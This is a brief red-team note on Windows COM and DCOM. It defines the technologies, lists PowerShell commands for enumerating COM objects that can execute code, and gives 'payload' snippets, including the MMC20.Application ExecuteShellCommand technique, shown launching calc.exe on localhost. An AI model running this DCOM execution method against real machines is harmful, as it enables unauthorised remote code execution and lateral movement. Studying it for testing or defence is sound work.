## Component Object Model (COM)

 is a platform-independent, distributed, object-oriented system for creating binary software components that can interact. COM is the foundation technology for Microsoft's OLE (compound documents), ActiveX (Internet-enabled components), as well as others.

## Distributed Component Object Model (DCOM)

 DCOM is a programming construct that allows a computer to run programs over the network on a different computer as if the program was running locally

* `CLSID – The Class Identifier (CLSID)` is a Global Unique Identifier (GUID). Windows stores a CLSID for each installed class in a program. When you need to run a class, you need the correct CLSID, so Windows knows where to go and find the program.
  * `oleview.exe` 

searching some COM Objects available and that can allows us to Execute code on the local machine.

```
Get-CimInstance -ClassName Win32_ComApplication
```

```
Get-CimInstance -ClassName Win32_ComApplication -property * | select-string shellwindows
```

### payload - COM

#### VB

```vbscript
Dim objXL
Set objXL = CreateObject("Excel.Application")
```

#### javascript

```javascript
var objXL = new ActiveXObject("Excel.Application");
```

### payload - DCOM

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","127.0.0.1")
$com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\Calc.exe",$null,$null,"7")
```